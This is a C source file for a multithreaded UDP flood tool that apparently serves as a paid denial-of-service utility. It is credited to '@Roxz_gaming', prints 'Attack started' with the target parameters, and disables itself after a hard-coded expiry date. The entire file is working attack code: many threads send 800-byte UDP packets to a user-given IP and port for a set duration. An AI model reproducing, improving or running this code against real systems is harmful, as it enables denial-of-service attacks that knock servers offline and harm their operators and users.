#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <pthread.h>
#include <arpa/inet.h>
#include <time.h>

#define BUFFER_SIZE 800
#define EXPIRATION_YEAR 2025
#define EXPIRATION_MONTH 2
#define EXPIRATION_DAY 2

int stopFlag = 0;
char *ip;
int port;
int duration;

pthread_mutex_t stopFlagMutex = PTHREAD_MUTEX_INITIALIZER;

void checkExpiration() {
    struct tm expirationTime = {0};
    expirationTime.tm_year = EXPIRATION_YEAR - 1900;
    expirationTime.tm_mon = EXPIRATION_MONTH - 1;
    expirationTime.tm_mday = EXPIRATION_DAY;

    time_t expirationTimestamp = mktime(&expirationTime);
    time_t currentTime = time(NULL);

    if (currentTime > expirationTimestamp) {
        fprintf(stderr, "This file is closed by @Roxz_gaming.\n");
        exit(1);
    }
}

void *sendUDPTraffic(void *arg) {
    int userID = *((int *)arg);
    free(arg);

    struct sockaddr_in serverAddr;
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        fprintf(stderr, "User %d: Failed to create socket\n", userID);
        return NULL;
    }

    memset(&serverAddr, 0, sizeof(serverAddr));
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(port);
    serverAddr.sin_addr.s_addr = inet_addr(ip);

    char buffer[BUFFER_SIZE] = "UDP traffic test";
    time_t endTime = time(NULL) + duration;

    // Sending traffic until the duration ends or stopFlag is set
    while (time(NULL) < endTime) {
        pthread_mutex_lock(&stopFlagMutex);
        if (stopFlag) {
            pthread_mutex_unlock(&stopFlagMutex);
            break;
        }
        pthread_mutex_unlock(&stopFlagMutex);

        ssize_t sentSize = sendto(sock, buffer, sizeof(buffer), 0, (struct sockaddr *)&serverAddr, sizeof(serverAddr));
        if (sentSize < 0) {
            fprintf(stderr, "User %d: Send failed\n", userID);
        }
        usleep(1000); // 1 ms sleep to simulate the rate of sending
    }

    close(sock);
    return NULL;
}

void *expirationCheckThread(void *arg) {
    while (1) {
        pthread_mutex_lock(&stopFlagMutex);
        if (stopFlag) {
            pthread_mutex_unlock(&stopFlagMutex);
            break;
        }
        pthread_mutex_unlock(&stopFlagMutex);
        
        checkExpiration();
        sleep(3600); // Check every hour
    }
    return NULL;
}

void signalHandler(int sig) {
    pthread_mutex_lock(&stopFlagMutex);
    stopFlag = 1;
    pthread_mutex_unlock(&stopFlagMutex);
}

int main(int argc, char *argv[]) {
    if (argc != 5) {
        fprintf(stderr, "Usage: %s <IP> <PORT> <DURATION> <THREADS>\n", argv[0]);
        exit(1);
    }

    ip = argv[1];
    port = atoi(argv[2]);
    duration = atoi(argv[3]);
    int threads = atoi(argv[4]);

    checkExpiration();

    // Print attack parameters
    printf("Attack started\n");
    printf("IP: %s\n", ip);
    printf("PORT: %d\n", port);
    printf("TIME: %d seconds\n", duration);
    printf("THREADS: %d\n", threads);
    printf("File is made by @Roxz_gaming only for paid users.\n");

    signal(SIGINT, signalHandler);
    signal(SIGTERM, signalHandler);

    pthread_t expirationThread;
    pthread_create(&expirationThread, NULL, expirationCheckThread, NULL);

    pthread_t *threadsArray = malloc(sizeof(pthread_t) * threads);
    if (threadsArray == NULL) {
        perror("Failed to allocate memory for threads");
        exit(1);
    }

    for (int i = 0; i < threads; i++) {
        int *userID = malloc(sizeof(int));
        *userID = i;
        if (pthread_create(&threadsArray[i], NULL, sendUDPTraffic, userID) != 0) {
            fprintf(stderr, "Failed to create thread for user %d\n", i);
        }
    }

    for (int i = 0; i < threads; i++) {
        pthread_join(threadsArray[i], NULL);
    }

    free(threadsArray);
    return 0;
}
